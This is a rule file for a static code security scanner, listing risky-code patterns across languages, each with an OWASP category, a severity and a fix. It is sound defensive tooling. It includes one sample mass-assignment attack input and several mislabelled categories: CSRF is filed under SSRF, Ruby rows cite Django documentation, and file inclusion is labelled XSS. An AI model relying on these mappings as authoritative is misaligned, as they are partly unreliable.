CategoryNo;CategoryName;CategoryType;Pattern;PatternName;Status;OutputFileName;IncludeComment;NotInternetFacing;IncludeIfSingleThread;Internal;Apply_BRs;Purpose;SearchOnlyFor;Classification;OWASP;Severity;Details;Remediation;Ref_1;Ref_2
40;Language;Python;send_default_pii;send_default_pii;Investigate;Language_Python_Investigate_send_default_pii;False;;True;False;True;;;Sensitive data exposure;A5-Security Misconfiguration;Medium;Sentry setting, when True (default is False), pii is not being filtered out.;Remove the parameter or put it to False.;https://docs.sentry.io/platforms/python/guides/logging/configuration/options/#send-default-pii;
40;Language;Python;csrf_exempt;csrf_exempt;Insecure;Language_Python_Insecure_csrf_exempt;False;Exclude;True;False;True;;;CSRF;A10-Server-Side Request Forgery (SSRF);Medium;Disables default csrf protection;;https://docs.djangoproject.com/en/2.1/topics/security;
45;Language;Ruby;attr_accessible;attr_accessible;Investigate;Language_Ruby_Investigate_attr_accessible;False;;True;False;True;;;Authentication and authorisation;A1-Broken Access Control;Medium;"Mass assignment issue in older versions. E.g. In form attacker adds  <input type=""hidden"" name=""is_admin"" value=""true"">.";;https://docs.djangoproject.com/en/2.1/topics/security;https://ropesec.com/articles/mass-assignment/
45;Language;Ruby;config.force_ssl = false;ssl_false;Insecure;Language_Ruby_Insecure_ssl_false;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;;should be True;https://docs.djangoproject.com/en/2.1/topics/security;
45;Language;Ruby;.find(;find;Investigate;Language_Ruby_Investigate_find;False;;True;False;True;;;SQL Injection;A3-Injection;High;;parameterized queries, escaping;https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheatsheet.html;
45;Language;Ruby;.where(;where;Investigate;Language_Ruby_Investigate_where;False;;True;False;True;;;SQL Injection;A3-Injection;High;;parameterized queries, escaping;https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheatsheet.html;
45;Language;Ruby;config.active_record.whitelist_attributes;whitelist_attributes;Investigate;Language_Ruby_Investigate_whitelist_attributes;False;;True;False;True;;;Input validation;A3-Injection;Informational;"Should be present in older versions. ""Strong parameters"" issue .";"Use ""Strong parameters"" gem.";https://docs.djangoproject.com/en/2.1/topics/security;https://ropesec.com/articles/mass-assignment/
45;Language;Ruby;open(;open;Investigate;Language_Ruby_Investigate_open;False;;True;False;True;;;Remote code execution;A3-Injection;High;May contain os command;;https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheatsheet.html;
45;Language;Ruby;acceptable_urls;acceptable_urls;Investigate;Language_Ruby_Investigate_acceptable_urls;False;;True;False;True;;;Open redirect;A3-Injection;Informational;Is a remedy against redirection to malicious sites.;;https://docs.djangoproject.com/en/2.1/topics/security;https://ropesec.com/articles/mass-assignment/
45;Language;Ruby;html_safe;html_safe;Investigate;Language_Ruby_Investigate_html_safe;False;;True;False;True;;;XSS;A3-Injection;Medium;Circumvents Ruby > 3.0 XSS protection;;https://docs.djangoproject.com/en/2.1/topics/security;
45;Language;Ruby;content_tag;content_tag;Investigate;Language_Ruby_Investigate_content_tag;False;;True;False;True;;;XSS;A3-Injection;Medium;Circumvents Ruby > 3.0 XSS protection;;https://docs.djangoproject.com/en/2.1/topics/security;
45;Language;Ruby;link_to ;link_to;Investigate;Language_Ruby_Investigate_link_to;False;;True;False;True;;;XSS;A3-Injection;Medium;link_to is a href tag, vulnerable in older versions.;"CSP. This forbids links starting with"" javascript:""";https://docs.djangoproject.com/en/2.1/topics/security;
45;Language;Ruby;application.config.session_store;application.config.session_store;Investigate;Language_Ruby_Investigate_application.config.session_store;False;;True;False;True;;;Session;A7-Identification and Authentication Failures;Medium;Default by cookies, that do not terminate session. Database is recommended for storage of  session id.; :active_record_store;https://docs.djangoproject.com/en/2.1/topics/security;
45;Language;Ruby;protect_from_forgery;protect_from_forgery;Investigate;Language_Ruby_Investigate_protect_from_forgery;False;;True;False;True;;;CSRF;A10-Server-Side Request Forgery (SSRF);Medium;;should exist;https://docs.djangoproject.com/en/2.1/topics/security;
45;Language;Ruby;:except;csrf_exception;Investigate;Language_Ruby_Investigate_csrf_exception;False;;True;False;True;;;CSRF;A10-Server-Side Request Forgery (SSRF);Medium;Exceptions may be harmful;Use of token authorization only protects against CSRF.;https://docs.djangoproject.com/en/2.1/topics/security;
50;Language;PHP;unlink(;unlink;Investigate;Language_PHP_Investigate_unlink;False;;True;False;True;;;Authorization;A1-Broken Access Control;High;;Authorization: Make sure user is owner of file;;
50;Language;PHP;rand(;rand;Investigate;Language_PHP_Investigate_rand;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;Only in security context;;;
50;Language;PHP;mysql_query;mysql_query;Investigate;Language_PHP_Investigate_mysql_query;False;;True;False;True;;;SQL Injection;A3-Injection;High;;;https://github.com/FloeDesignTechnologies/phpcs-security-audit;
50;Language;PHP;exec;exec_2;Investigate;Language_PHP_Investigate_exec_2;False;;True;False;True;;;Remote code execution;A3-Injection;High;;;https://github.com/FloeDesignTechnologies/phpcs-security-audit;
50;Language;PHP;"header(""Location:";header_location;Insecure;Language_PHP_Insecure_header_location;False;;True;False;True;;;Open redirect;A3-Injection;High;Redirects to what location?;URL whitelisting;;
50;Language;PHP;include($_GET[;include_get;Investigate;Language_PHP_Investigate_include_get;False;;True;False;True;;;XSS;A3-Injection;High;;"include('./includes/somefile.php');";;
50;Language;PHP;libxml_disable_entity_loader(false;libxml_disable_entity_loader_false;Insecure;Language_PHP_Insecure_libxml_disable_entity_loader_false;False;;True;False;True;;;XXE;A5-Security Misconfiguration;High;;Should be true;https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet;
50;Language;PHP;unserialize(;unserialize;Investigate;Language_PHP_Investigate_unserialize;False;;True;False;True;;;Input validation;A8-Software and Data Integrity Failures ;High;Deserialization vulnerability;Use safe interchange format like JSON;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
50;Language;PHP;phpinfo;phpinfo;Investigate;Language_PHP_Investigate_phpinfo;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;;;https://github.com/FloeDesignTechnologies/phpcs-security-audit;
50;Language;PHP;fread;fread;Investigate;Language_PHP_Investigate_fread;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Medium;;;https://github.com/FloeDesignTechnologies/phpcs-security-audit;
60;Language;JavaScript;*CF_SCRIPT(ONLOAD);onload;Investigate;Language_JavaScript_Investigate_onload;False;;True;False;True;;;XSS;A3-Injection;High;Search for malicious code. ;;;
60;Language;JavaScript;expression;expression;Investigate;Language_JavaScript_Investigate_expression;False;;True;False;True;;;XSS;A3-Injection;High;Search for malicious code. ;;;
60;Language;JavaScript;*CF_SCRIPT(SRC);src;Investigate;Language_JavaScript_Investigate_src;False;;True;False;True;;;XSS;A3-Injection;High;Search for malicious code. ;;;
60;Language;JavaScript;jwt.decode(;jwt_decode;Investigate;Language_JavaScript_Investigate_jwt_decode;False;;True;False;True;Locate;;Security misconfiguration;A7-Identification and Authentication Failures;High;Jwt.decode() does not verify the signature.; Use jwt.verify() instead.;https://www.netsparker.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities/;
60;Language;JavaScript;storage;storage;Investigate;Language_JavaScript_Investigate_storage;False;;True;False;True;Locate;;XSS;A3-Injection;High;Local and - less easily- Sessionstorage can be read by an attacker.;Encrypt sensitive data. E.g. Using npm encrypt-storage.;https://blog.bitsrc.io/sessionstorage-and-localstorage-a-ux-security-comparison-a05c486413e0;
60;Language;JavaScript;InnerHTML;InnerHTML;Investigate;Language_JavaScript_Investigate_InnerHTML;False;;True;False;True;;;XSS;A3-Injection;High;;;;
60;Language;JavaScript;${param.;query_parameter;Investigate;Language_JavaScript_Investigate_query_parameter;False;;True;False;True;;;XSS;A3-Injection;High;Check if query parameters are validated/sanitized;;https://www.developer.com/java/other/article.php/883381/jsp-security.htm;
60;Language;JavaScript;setInterval(;setInterval;Investigate;Language_JavaScript_Investigate_setInterval;False;;True;False;True;;;DoS;A4-Insecure Design;Low;;clearInterval;https://reliablejavascript.com/2017/11/05/how-timer-intervals-can-leak-memory/;
60;Language;JavaScript;document.cookie;document_cookie;Investigate;Language_JavaScript_Investigate_document_cookie;False;;True;False;True;;;Authentication;A7-Identification and Authentication Failures;Medium;Should normally be set to httpOnly and Secure;;;
60;Language;JavaScript;console.log;console_log;Investigate;Language_JavaScript_Investigate_console_log;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;Privacy may be violated. The disclosure of session ID's may enable an attacker to take over user sessions.;Encrypt sensitive information or implement environment dependent logging of  sensitive information, ensure it is turned off by default.;;
60;Language;JavaScript;window.open(;window_open;Insecure;Language_JavaScript_Insecure_window_open;False;;True;False;True;Locate;;Phishing;A10-Server-Side Request Forgery (SSRF);Low;window.open vulnerability, without setting myNwWdw.opener = null afterwards.;myNwWdw.opener = null afterwards;https://www.owasp.org/index.php/Reverse_Tabnabbing;https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
60;Language;JavaScript;window.location;window_location;Investigate;Language_JavaScript_Investigate_window_location;False;;True;False;True;;AssignedTo;XSS;A3-Injection;Medium;Avoid user-coontrolled data to be dynamically written to the HTML document.;Use e.g. encodeURI();;
60;Language;JavaScript;_blank;_blank;Insecure;Language_JavaScript_Insecure__blank;False;;True;False;True;;;Phishing;A10-Server-Side Request Forgery (SSRF);Low;"window.open vulnerability, when using target=""_blank"" without rel=""noopener noreferrer""";"rel=""noopener noreferrer""";https://www.owasp.org/index.php/Reverse_Tabnabbing;https://mathiasbynens.github.io/rel-noopener/
70;Language;AngularJS;bypassSecurityTrust;bypassSecurityTrust;Investigate;Language_AngularJS_Investigate_bypassSecurityTrust;False;;True;False;True;;;XSS;A3-Injection;Medium;Circumvents  Angular XSS protection.;;https://angular.io/guide/security;
70;Language;AngularJS;$sce;$sce;Investigate;Language_AngularJS_Investigate_$sce;False;;True;False;True;;;XSS;A3-Injection;Medium;"sce = Angular's Strict Contextual Auto Escaping. Circumvents Angular XSS protection when specifying ""$sce.enabled(false)"".";"Use ""ng-bind-html=…"" in the view and import ""ngSanitize"" in the angular.module.";https://owasp.org/www-pdf-archive/Benelus_day_20161125_S_Lekies_Securing_AngularJS_Applications.pdf;
70;Language;AngularJS;.html(;element_html;Investigate;Language_AngularJS_Investigate_element_html;False;;True;False;True;;;XSS;A3-Injection;Medium;"""angular.element(…).html(userInput)"". jqLite api's circumvent Angular XSS auto-escape protection.";"Use ""ng-bind-html=…"" in the view and import ""ngSanitize"" in the angular.module.";https://owasp.org/www-pdf-archive/Benelus_day_20161125_S_Lekies_Securing_AngularJS_Applications.pdf;
70;Language;AngularJS;.trustAsHtml(;trustAsHtml;Investigate;Language_AngularJS_Investigate_trustAsHtml;False;;True;False;True;;;XSS;A3-Injection;Medium;"""$sce.trustAsHtml(userInput)"" circumvents Angular XSS auto-escape protection.";"Use ""ng-bind-html=…"" in the view and import ""ngSanitize"" in the angular.module.";https://owasp.org/www-pdf-archive/Benelus_day_20161125_S_Lekies_Securing_AngularJS_Applications.pdf;
70;Language;AngularJS;escapeForHtml;escapeForHtml;Investigate;Language_AngularJS_Investigate_escapeForHtml;False;;True;False;True;;;XSS;A3-Injection;Medium;"""escapeForHtml(userInput)"". This is a DIY that may circumvents Angular XSS auto-escape protection.";"Use ""ng-bind-html=…"" in the view and import ""ngSanitize"" in the angular.module.";https://owasp.org/www-pdf-archive/Benelus_day_20161125_S_Lekies_Securing_AngularJS_Applications.pdf;
70;Language;AngularJS;$interval;interval;Investigate;Language_AngularJS_Investigate_interval;False;;True;False;True;;;DoS;A4-Insecure Design;Low;;$interval.cancel(;https://docs.angularjs.org/api/ng/service/$interval;
80;Language;React;createElement;createElement;Investigate;Language_React_Investigate_createElement;False;;True;False;True;;;XSS;A3-Injection;High;;React version 0.14.0 or higher;https://snyk.io/vuln/npm:react:20150318;
80;Language;React;stringify;stringify;Investigate;Language_React_Investigate_stringify;False;;True;False;True;;;XSS;A3-Injection;High;;serialize;https://medium.com/node-security/the-most-common-xss-vulnerability-in-react-js-applications-2bdffbcc1fa0;
80;Language;React;dangerouslySetInnerHTML;dangerouslySetInnerHTML;Investigate;Language_React_Investigate_dangerouslySetInnerHTML;False;;True;False;True;;;XSS;A3-Injection;High;;;https://reactjs.org/docs/dom-elements.html;
80;Language;React;navigation.navigate(;navigation;Investigate;Language_React_Investigate_navigation;False;;True;False;True;;;Authentication;A7-Identification and Authentication Failures;High;Circumvents  React auth_flow.;;https://reactnavigation.org/docs/auth-flow/;
85;Language;HTML;*CF_INPUT(<input);input;Investigate;Language_HTML_Investigate_input;False;;True;False;True;;;Input validation;A3-Injection;High;;;;
90;Language;C;strcpy;strcpy;Insecure;Language_C_Insecure_strcpy;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned;strcpy_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;strcat;strcat;Insecure;Language_C_Insecure_strcat;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned;strcat_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;strncpy;strncpy;Insecure;Language_C_Insecure_strncpy;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned;strcpy_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;strncat;strncat;Insecure;Language_C_Insecure_strncat;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned;strcat_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;strtok;strtok;Insecure;Language_C_Insecure_strtok;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned;strtok_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;makepath;makepath;Insecure;Language_C_Insecure_makepath;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned;_makepath_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;stok;stok;Insecure;Language_C_Insecure_stok;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: _wcstok, ;strtok_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;scanf;scanf;Insecure;Language_C_Insecure_scanf;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned;sscanf_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;_itoa;_itoa;Insecure;Language_C_Insecure__itoa;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned;_itoa_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;isBad;isBad;Insecure;Language_C_Insecure_isBad;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: IsBadWritePtr, IsBadHugeWritePtr, IsBadReadPtr, IsBadHugeReadPtr, IsBadCodePtr, IsBadStringPtr. As bad as catching all exceptions.;Rewrite code;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;alloca;alloca;Insecure;Language_C_Insecure_alloca;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned;Rewrite code;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;CharToOem;CharToOem;Insecure;Language_C_Insecure_CharToOem;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: CharToOem, CharToOemA, CharToOemW, CharToOemBuffA, CharToOemBuffW;Rewrite code;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;gett;gett;Insecure;Language_C_Insecure_gett;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: _getts, _gettws;gets_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;gets;gets;Insecure;Language_C_Insecure_gets;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: gets;gets_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;OemToChar;OemToChar;Insecure;Language_C_Insecure_OemToChar;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: OemToChar, OemToCharA, OemToCharW;Rewrite code;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;strlen;strlen;Insecure;Language_C_Insecure_strlen;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;"banned; strlen, _mbstrlen,  lstrlen";strlen_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;i64;i64;Insecure;Language_C_Insecure_i64;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: _i64toa, _i64tow, _ui64toa, _ui64tot, _ui64tow;_itoa_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;slen;slen;Insecure;Language_C_Insecure_slen;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: wcslen, _mbslen;strlen_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;memcpy;memcpy;Insecure;Language_C_Insecure_memcpy;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: memcpy, wmemcpyn;memcpy_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;CopyMemory;CopyMemory;Insecure;Language_C_Insecure_CopyMemory;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: RtlCopyMemory, CopyMemory;memcpy_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;Scala;SAXParserFactory;SAXParserFactory;Insecure;Language_Scala_Insecure_SAXParserFactory;False;;True;False;True;;;XXE;A5-Security Misconfiguration;Medium;;"Generally, disable DTD (External Entities). E.g. via ""SaxParserFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)"" or ""SaxParserFactory.setFeature(""http://apache.org/xml/features/disallow-doctype-decl"", true);""";https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet;https://blog.codacy.com/8-more-scala-security-issues-you-should-know-about/
50;Language;Scala;deserializeObject(;deserializeObject;Investigate;Language_Scala_Investigate_deserializeObject;False;;True;False;True;;;Input validation;A8-Software and Data Integrity Failures ;High;Deserialization vulnerability;Avoid deserializing objects provided by end users.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;https://blog.codacy.com/9-scala-security-issues/
50;Language;Scala;NullCipher;NullCipher;Investigate;Language_Scala_Investigate_NullCipher;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;NullCipher returns the plain tekst.;Avoid  using NullCipher (in production).;https://blog.codacy.com/9-scala-security-issues/;
500;Company;KPN;@kpn.com;mail_kpn;Investigate;Company_KPN_Investigate_mail_kpn;False;;True;False;True;;;Authentication and authorisation;A7-Identification and Authentication Failures;Medium;Email spoofing?;;;
500;Company;ilionx;@ilionx.com;mail_ilionx;Investigate;Company_ilionx_Investigate_mail_ilionx;False;;True;False;True;;;Authentication and authorisation;A7-Identification and Authentication Failures;Medium;Email spoofing?;;;
500;Company;Lyanthe;@lyanthe.com;mail_lyanthe;Investigate;Company_Lyanthe_Investigate_mail_lyanthe;False;;True;False;True;;;Authentication and authorisation;A7-Identification and Authentication Failures;Medium;Email spoofing?;;;
